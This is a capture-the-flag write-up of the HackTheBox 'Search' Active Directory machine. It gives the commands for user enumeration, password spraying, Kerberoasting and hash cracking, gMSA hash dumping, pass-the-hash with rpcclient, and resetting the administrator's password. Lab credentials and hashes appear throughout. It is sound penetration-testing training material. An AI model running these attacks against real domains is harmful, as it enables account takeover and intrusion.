# Search Machine(10.10.11.129)

## Info:
This was a hard windows box from HackTheBox which focused on windows Active Directory Pentesting, we will to enumerate valid users through kerveros then crack some passswords then find some certs then crck those certs then do privilege escaltion by Reading password GMSA account password and reset admin account password through that and get root.

This was yet another my faviourte box from htb learned so many things about pentesting Active Directory machines. How kerberosating, Kerberos, bloodhound, impacket and msrpc things work. Looking forward to doing more windows machine. 

*Ps: I did this box after it retired and had access to ippsec video and 0xdf blog and I'm thankful to them for their work so that we can learn new stuffs.*

![Search](https://user-images.githubusercontent.com/79413473/166974076-31ccd362-a4c4-4399-92cf-fa4f39e9cab4.png)

## Recon:
Starting with nmap port scan we get many multiple open ports as expected from windows Active Directory Machines.

```
$ nmap -p- --min-rate 10000 10.10.11.129
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-05 23:19 IST
....[Snip]

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
8172/tcp  open  unknown
9389/tcp  open  adws
49666/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49694/tcp open  unknown
49708/tcp open  unknown
49728/tcp open  unknown
```
```
$ nmap -A -p53,80,88,139,135,389,443,445,464,593,636,3268,3269,8172,9389,49666,49669,49670,49694,49708,49728 --min-rate 10000 10.10.11.129 -oN nmap_scan
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-05 23:31 IST
Nmap scan report for 10.10.11.129
Host is up (0.31s latency).

PORT      STATE    SERVICE          VERSION
53/tcp    open     domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open     http             Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open     kerberos-sec     Microsoft Windows Kerberos (server time: 2022-05-05 18:01:28Z)
135/tcp   open     msrpc            Microsoft Windows RPC
139/tcp   open     netbios-ssn      Microsoft Windows netbios-ssn
389/tcp   open     ldap             Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-05-05T18:05:18+00:00; 0s from scanner time.
443/tcp   open     ssl/http         Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-05-05T18:05:18+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http       Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap         Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-05-05T18:05:17+00:00; -1s from scanner time.
3268/tcp  filtered globalcatLDAP
3269/tcp  filtered globalcatLDAPssl
8172/tcp  open     ssl/http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_ssl-date: 2022-05-05T18:05:17+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open     mc-nmf           .NET Message Framing
49666/tcp open     msrpc            Microsoft Windows RPC
49669/tcp open     ncacn_http       Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc            Microsoft Windows RPC
49694/tcp open     msrpc            Microsoft Windows RPC
49708/tcp filtered unknown
49728/tcp open     msrpc            Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=627410FD%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-05-05T18:04:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 247.66 seconds
```

It reveals SMB,LDAP, Kerberos and Windows RPC etc. service is running. LDAP leaks domain name **search.htb** and SSL cert leaks host **research**. Let's add these to our /etc/hosts file.

![Screenshot from 2022-05-06 11-30-56](https://user-images.githubusercontent.com/79413473/167075612-4269e6c7-a8de-40a2-b7fe-5ecf7757898e.png)

There is no difference between search.htb and research.search.htb. Viewing https SSL cert gives same hosts

![Screenshot from 2022-05-06 11-34-37](https://user-images.githubusercontent.com/79413473/167075966-cea20291-6271-406d-9561-e4847af7402a.png)

Running ffuf gives
```
$ ffuf -u http://search.htb/FUZZ -w ~/wordlist/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://search.htb/FUZZ
 :: Wordlist         : FUZZ: /home/ubuntu/wordlist/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

images                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 238ms]
js                      [Status: 301, Size: 144, Words: 9, Lines: 2, Duration: 239ms]
css                     [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 241ms]
fonts                   [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 748ms]
staff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 6628ms]
                        [Status: 200, Size: 44982, Words: 13260, Lines: 1030, Duration: 694ms]
```

*/staff* gives permission denied error 403

![Screenshot from 2022-05-06 11-42-29](https://user-images.githubusercontent.com/79413473/167076868-f3b75122-c4be-41d9-9c1e-8fe1b63d5f0d.png)

## Foothold: Cracking passwords and hopping thorugh multiple users

Reading HackTricks how to attack AD it is very clear thta we need to start with gathering few usernames to start with user enumeration and futher attacks on them. Teams page have few potential users.

![Screenshot from 2022-05-06 11-44-04](https://user-images.githubusercontent.com/79413473/167077376-fe0bdc2c-4d98-4db3-9219-6130ab0c25b1.png)

```
Keely.Lyons
Dax.Santiago
Sierra.Frye
Kyla.Stewart
Kaiara.Spencer
Dave.Simpson
Ben.Thompson
Chris.Stewart
```

We can use a tool like [kerbrute](https://github.com/ropnop/kerbrute) to enumerate valid users due to problem in how kerberos respond for valid and invalid users. 

Running userenum module on possible users we get 3 valid users.

```
$ ./kerbrute userenum -d search.htb --dc 10.10.11.129 users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/06/22 - Ronnie Flathers @ropnop

2022/05/06 11:52:06 >  Using KDC(s):
2022/05/06 11:52:06 >  	10.10.11.129:88

2022/05/06 11:52:06 >  [+] VALID USERNAME:	 Keely.Lyons@search.htb
2022/05/06 11:52:07 >  [+] VALID USERNAME:	 Sierra.Frye@search.htb
2022/05/06 11:52:07 >  [+] VALID USERNAME:	 Dax.Santiago@search.htb
2022/05/06 11:52:07 >  Done! Tested 8 usernames (3 valid) in 0.472 seconds
```

But we don't have any password, we can try cracking them with rockyou but no success so far after running for 5 minnutes. Let's use something else which is also called public information gathering. On website there is a useraname specified and it's password in a image bit odd for HTB boxes.

![Screenshot from 2022-05-06 12-02-15](https://user-images.githubusercontent.com/79413473/167079126-befccada-2fc8-486a-b0aa-8c18bf49846d.png)

zoom a little bit and you will see **"Hope Sharp: IsolationIsKey?"** as creds. Let's put and Hope.Sharp in users list and `IsolationIsKey?` in password list. And run Kerbrute again and indeed Hope.Sharp is a valid username on machine.

![Screenshot from 2022-05-06 12-07-09](https://user-images.githubusercontent.com/79413473/167079701-947c57fd-e89c-4372-bd27-40a278078119.png)

This password works on Hope Sharp only 

```
./kerbrute passwordspray --dc 10.10.11.129 -d search.htb users.txt  "IsolationIsKey?"

2022/05/06 12:08:37 >  [+] VALID LOGIN:	 Hope.Sharp@search.htb:IsolationIsKey?
2022/05/06 12:08:37 >  Done! Tested 9 logins (1 successes) in 1.776 seconds
```

With crackmapexec we can list shares accessible through Hop.Sharp account.

```
$ cme smb 10.10.11.129 -u Hope.Sharp -p "IsolationIsKey?" --shares
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Hope.Sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [+] Enumerated shares
SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk                        
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share 
```

helpdesk share has directory listing disabled and SYSVOL has some random stuffs and certenroll has certificayes for search.htb. In **RedirectedFolders$** we get some more usernames as directories but we don't have acess to read those contents. Let's collect these usernames.

![Screenshot from 2022-05-06 12-48-13](https://user-images.githubusercontent.com/79413473/167085383-e69b180e-ba7e-4d78-884c-564faabd93c6.png)

### Collecting Domain information 

At this point we only have one set of credentials and no login but we can use those credentials to dump information like how many users are there cimputers connected and domain admins and more. We can use tools like ldapdomaindump or Bloodhound ingestor. I will use [bloodhound python ingestor](https://github.com/fox-it/BloodHound.py) to dump info. Install the tool and then run, `all` flag is set to dump everything.

```
python3 bloodhound.py -u Hope.Sharp -p "IsolationIsKey?" -d search.htb -ns 10.10.11.129 -c all
```

This will create json files in current directory and now we can upload these files to [bloodhound](https://github.com/BloodHoundAD/BloodHound)  which will require neo4j for graphic work and DB. neo4j doesn't come by default in apt repository so wyou will have to add that in apt list. 

ippsec did a detailed video on bloodhound usages.

In bloodhound we can see domain admins and some low privilege accounts.

![Screenshot from 2022-05-06 14-45-21](https://user-images.githubusercontent.com/79413473/167103525-8d1390db-1057-413d-a4c5-d49758eb1d6f.png)

It also shows accounts which are kerberoastable account

![Screenshot from 2022-05-06 14-43-33](https://user-images.githubusercontent.com/79413473/167103622-6c529ab4-33ea-476d-88a1-a3f1f2f59223.png)

This web_svc account is temporary account created by helpdesk. This is service account we will use [Kerberoasting Attack]  on this attack to get password hash of user who is using this service and when we request a ticket it is encrypted with that hash. Let's get that hash using impacket's `GetUserSPNs.py` toolkit. 

GetuserSPN also identifies the SPN account assocuated with hope.sharp account i.e web_svc

```
$ GetUserSPNs.py -dc-ip 10.10.11.129 search.htb/hope.sharp:IsolationIsKey? 
Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 18:29:11.329031  <never>               

```

Let's request the tgs and get hash
```
$ GetUserSPNs.py -dc-ip 10.10.11.129 search.htb/hope.sharp:IsolationIsKey? -request
Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 18:29:11.329031  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$9ae7d5662e1016f4c0417e523cfb1d84$60139187c7839338d3eb678924dfca5b35737c6f81ea55b189054c608ff74fd4d0051740441eee29bbd8508c2d9822202e4aad637965e43d40011526845b5c338e6352e03986e8012a4450132ea5227e7dc743e319d6c560b8ae59306b3e8deb2920283a97d159fca946d15e846fd146d7b94ff10630d2f2f7b641c7c21f1da7bf5af959d9b72ef71458067d041df8f3e6d6a59ad1499c04023705942202e977138805fe82db3621285da41bb70f1a229b6ef9307dad86b6e4a0a55c8e111d5b175e1320446f03f1c3f50b692960845801da85c913b6b77b44e98e334ac413931ac636b6cdef9671492092acd1e79e96aff5a2a4135e13ebdc363f6fb113ac3d8ceaa751a7b0e38d089696621abf1b9907fea07db5cff1e0c0cd62074ea89aee9bd4f15d95f0d9ca631fdbf30f91b56c42735bac6be2eabe9b53c180a83bd9a4902ee1f7fc7195a5292143ecf1239a7ca2985ba23dded69851c78e6c745ca65cd583aff4253451a58c05294ccae92d1e123df7ff6da50fa4d3d40fde4f0f4b425d0ce8458b61ff6bd420105edf477999d45c0bfd6c36d4109ef6b09d04a40c7db0a3a8ada409aaba2bb8127c8d9301327a8281872090162c75bbbb2b1260ac27873ba5048f0a5087a98a24a7e876d75b2ddfaf0166d39ba9293f3214d80594e717f1bf7981c6291d1c0994ff28d4abf7466da60d105fcee84f813114bba237348ad35e946f3cf3924beb4b691fa49af15cdbab4d02a6013a9f229376781ee1b32814b2c5fe474fb3b304d3e1e7695a36546eb2e3709d175713c594460965bdff200a615e2a0fa45a600bd59fa3de2e92cc3d3c6daf4a1428c1d592b4903f880f51b3c2701ab4b301bb9a2744ad07b787c86061eec0ea38abcdd8db243c41a800a570009fe438c11f068d8896d0f3e8f93d7963a2fb96060929aa615ed4aebfc2ffdb58ee35aa620d1bb564d0e3efe614636bf96eeb4b63a65bd8c773c4d22d0a69df34533b65939fb9ea363c0a5341ff605d0bf1cb03db71a7f38faa354a38cb879fd6431f4ba0bb65aec463119936797b50bd6970ec698a98ed5462805037153ed254d04e38364d0d362215cf4702228a119db972b92660038276cb75c909b5f0323323af741af9b77900416ea621e68188b15eacbbe24d402510a11b665b4825de755d5d416c4d4659529447242140aaa698b92f5912bf1e184b41b28c903746a035a38f51bc0ab97a081221c16b2520c6add745d6f63db585e008b405bdae904f7f0426d0783dcc6374bb1e10fc666b4e0c0f73717caac6114b7e2981fbaad932ce2aba369b5d0c3faf250e56956bb2e81f1cbbbc89b38602fb12b2e7625bdb0638b8523284da98f7f51cd6dcf3c2c70d3ca44898cff70462f50ae650781cd88bd19025c3394b2c05d0508456664af0276f7a20b7d36e90947f1f96daec5b8b1dda8ac6feb4ecce1a4ef8e1ac2f1091a6b31e8a
```

Now we can crack this hash with hashcat `hashcat/hashcat hash wordlists/rockyou.txt` and it cracks it.

```

$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$4b65abbb75a36776001fda11b....[Snip]: @3ONEmillionbaby
```

Let's add this to password list maybe it is used by someone else also. Now we can use kerbrute again for passwordspray or cme. I used cme and got a success.

```
$ cme smb 10.10.11.129 -u users.txt -p @3ONEmillionbaby --continue-on-success 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
....[snip]....
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE 

.....[Snip]....

```

We now own **Edgar Jacobs** also, let's check what shares i have access as edgar
```
$ cme smb 10.10.11.129 -u edgar.jacobs -p @3ONEmillionbaby --shares
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
SMB         10.10.11.129    445    RESEARCH         [+] Enumerated shares
SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk        READ            
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share 
```
In RedirectedFolders$ i have permission to list other's directory but not read. sierra.frye hash user.txt file. For now let's hop into our directory and check what edgar owns as he is a helpdesk user(as per bloodhound description) he has some intersting files.

![Screenshot from 2022-05-06 16-20-34](https://user-images.githubusercontent.com/79413473/167118099-7a1adbd2-d5a4-42b6-85c7-6ff5e11209fd.png)


Let's open this phising attempt excel document and try to edit something and we get this error

![Screenshot from 2022-05-06 16-23-24](https://user-images.githubusercontent.com/79413473/167118497-3354c70a-9873-4d5e-82d6-0073596f3c60.png)

we can overcome this by unzipping the excel file and remove the Protection unit form sheet2.xml file.

![Screenshot from 2022-05-06 16-30-58](https://user-images.githubusercontent.com/79413473/167119515-fe2587e6-4bbb-48dc-ae59-9f7dc1717e94.png)

Delete this protected block and remove the previous xlsx file and zip everything left. `zip new.xlsx -r .` zip every file recursively into new.xlsx file. Open this file in libreoofice and slide a column rightwards and we see new column passwords.

![Screenshot from 2022-05-06 16-36-59](https://user-images.githubusercontent.com/79413473/167120369-515adada-76c7-4d1a-85e4-ac6dc9de1450.png)

Add these passwords to our password list although it's unlikely that someone else's password is used by someone else as this is a phising document everyone typed their own password. we can bruteforce every possible combination. But we will just use no-bruteforcce mode for now, every username and their corresponding password as per phising doc and we can use cme smb no-bruteforce mode. Among that sierra.frye password works. 

![Screenshot from 2022-05-06 17-04-28](https://user-images.githubusercontent.com/79413473/167123985-2999cfba-c051-4ac1-98ef-d1f28281cd01.png)

And bloodhound shows that from Sierra we can become domain admin because she is member of `BIRMINGHAM-ITSEC` and by that member of `ITSEC` and has `ReadGMSAPassword` capability.

![Screenshot from 2022-05-06 21-22-32](https://user-images.githubusercontent.com/79413473/167168655-5d56c332-3736-4ea4-b303-cc7e6cbe7656.png)


Let's first login to smb share with sierra credential and get user flag

`smbclient -U sierra.frye //10.10.11.129/RedirectedFolders$` Enter password when prompted `$$49=wide=STRAIGHT=jordan=28$$18`

In */Downloads/Backups* there are some SSL certificates, let's grab them as they are different from search.htb certs.

Now as name suggests **staff.pfx** this could be a certificate to access */staff* directory by sierra,which was earlier 403. let's try to import that to firefox browser. But it asks for password 

![Screenshot from 2022-05-06 21-32-57](https://user-images.githubusercontent.com/79413473/167170079-7517fa2a-afd3-4a0a-b447-3e8964feed96.png)

Now we can crack this certificate's password with multiple tools but for some reason john-the-ripper doesn't work and tthat's why i only prefer hashcat as using that i can crack passwords in google cloud. Other tools are available to cracks pfx certs but i don't want to give unnecessary stress to my laptop. It ain't that strong.

I already know the password as i am doing this after box retired. Password is `misspissy`. use this to import cert in firefox

![Screenshot from 2022-05-06 22-16-56](https://user-images.githubusercontent.com/79413473/167176636-06b6d80a-a495-452d-b393-6329cb6626db.png)

Now let's check https://search.htb/staff page(must be https) for certificates to work. When asking for certificate press ok and we got a login panel

![Screenshot from 2022-05-06 22-25-06](https://user-images.githubusercontent.com/79413473/167177824-f4867a07-3a00-42c7-a64b-0c9e9c94d7bd.png)

As this was sierra's cert it makes sense to put her credentials and computer name as `research` we get a powershell access in browser.

![Screenshot from 2022-05-06 22-28-17](https://user-images.githubusercontent.com/79413473/167178310-58d9403e-63c6-4981-b05d-c11a380cf8b0.png)

## Privilege Escaltion:

As shown in bloodhound path 

![Screenshot from 2022-05-06 22-31-19](https://user-images.githubusercontent.com/79413473/167178798-f060e920-c69e-4d4a-8b45-0cf9b4978b7e.png)

Sierra can GMSA password of `BIR-ADFS-GMSA` account and once you become `BIR-ADFS-GMSA` user on machine you have all privileges like `TRISTAN.DAVIES` due to GenericAll privilege set. Which means we can execute command as Tristan or change his password and login to smb or get a shell as tristan. 

There are multiple ways to follow the attack. 

### Dumping `BIR-ADFS-GMSA` NTLM hash as sierra 
While searching for `ReadGMSAPassword` I found [this](https://www.thehacker.recipes/ad/movement/access-controls/readgmsapassword) which shows how using gMSAdumper [tool](https://github.com/micahvandeusen/gMSADumper) we can get `BIR-ADFS-GMSA` hash which gives direct access his account by rpcclient. This way we don't even have to crackc the pfx cert.

```
$ python3 gMSADumper.py -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb
Users or groups who can read password for BIR-ADFS-GMSA$:
 > ITSec
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
```
This is NTLM hash of BIR-ADFS-GMSA and if winrm was enabled on this machine we could have just login on server by passing this hash, read more [here](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm#using-evil-winrm) .

But MS-RPC is enabled so we will use a tool called `rpcclient` it is already there in linux distrubutions. It supports login with NTLM hash also.

`rpcclient -U 'BIR-ADFS-GMSA$' --pw-nt-hash 10.10.11.129` `$` in username is necessary because that's how windows identify Managed Service Accounts(GMSA).

Enter hash `e1e9fd9e46d0d747e1595167eedcec0f` when prompted for password you will get acess as `BIR-ADFS-GMSA`.

As `BIR-ADFS-GMSA` hash same access as `tristan.davies` we will reset his password to *password*.

`setuserinfo2 tristan.davies 23 'password'` . Let''s test if that worked

```
$ cme smb 10.10.11.129 -u 'tristan.davies' -p 'password' --shares
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:password (Pwn3d!)
SMB         10.10.11.129    445    RESEARCH         [+] Enumerated shares
SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$              READ,WRITE      Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ,WRITE      Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk                        
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share 
```

We can login as tristan and read root.txt file. Also can get a shell using impacket's `wmiexec` which also utilises msrpc. 

`wmiexec.py search.htb/tristan.davies:password@10.10.11.129` enter new password on prompt.

![Screenshot from 2022-05-06 23-18-25](https://user-images.githubusercontent.com/79413473/167187719-e0fb1300-0435-4785-8b7f-4ca12d50ffca.png)

![Screenshot from 2022-05-06 23-19-23](https://user-images.githubusercontent.com/79413473/167188035-14c01883-b5b7-4624-972f-d78b4e2adc3a.png)

And we get root on machine.

### Resetting `Tristan.Davies` password from web powershell console

After importing certificate and having powershell as sierra.frye we can extract `BIR-ADFS-GMSA` password and use that to for privilege escaltion. Let's extract password by running following commands

```
1. $gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
2. $mp = $gmsa.'msDS-ManagedPassword'
3. ConvertFrom-ADManagedPasswordBlob $mp
```
![Screenshot from 2022-05-06 23-34-24](https://user-images.githubusercontent.com/79413473/167192423-ca8b0a06-6113-430e-8d3f-86270bcaa206.png)

As password is not in cleartext, let's store it in a variable to execute command as that user.

`$a=(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword`. Only Secure Password can be used to run commands. 

Now let's create a credential variable to store this 

```
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ('BIR-ADFS-GMSA$', $a)
```
Let's execute command in `BRI-ADFS-GMSA` context
```
Invoke-Command -Credential $creds -ComputerName 127.0.0.1 -ScriptBlock {whoami}
```
Don't forget `-ComputerName` flag as i wasted some time with that. 

![Screenshot from 2022-05-07 00-08-27](https://user-images.githubusercontent.com/79413473/167198413-b565a0ec-6244-438b-8c92-da2a8e6e9f80.png)

As now we can run command we have full access over tristan.davies also due to GenericAll privilege.

Let's reset tristan.davies password with following command
```
1. $NewPwd = ConvertTo-SecureString "password@123" -AsPlainText -Force
2. Set-ADAccountPassword -Identity tristan.davies -NewPassword $NewPwd -Reset
```
it will changes AD user tristan.davies password to `password@123`.

Let's run it as `BRI-ADFS-GMSA`

```
Invoke-Command -Credential $creds -ComputerName 127.0.0.1 -ScriptBlock {$NewPwd = ConvertTo-SecureString "password@123" -AsPlainText -Force;Set-ADAccountPassword -Identity tristan.davies -NewPassword $NewPwd -Reset}
```

Now we can excute commands as Tristan with password `password@123`. Let's login to smb to verify, it worked.

![Screenshot from 2022-05-07 00-23-02](https://user-images.githubusercontent.com/79413473/167200359-a93bb5d4-51e4-41df-8c24-c5b50011cc43.png)

We can also get a shell from here with msrpc using `wmiexec.py` like we did previously with these new credentials. We can also get reverse shell from here by putting a reverse shell in -ScriptBlock as Tristan user there were some AV evasion challange which filtered some keywords. Ippsec showed it how removing certain things worked. 

But for now this is enough we got shell and root flag other ways. 

![Screenshot from 2022-05-07 00-26-34](https://user-images.githubusercontent.com/79413473/167200813-b7915e9e-c756-4cb7-9653-cb7d3a0c7641.png)


Thanks for sticking and feedback are welcome hope you learned some new things as i did with this machine.

Twitter: [Avinashkroy](https://twitter.com/avinashkroy)

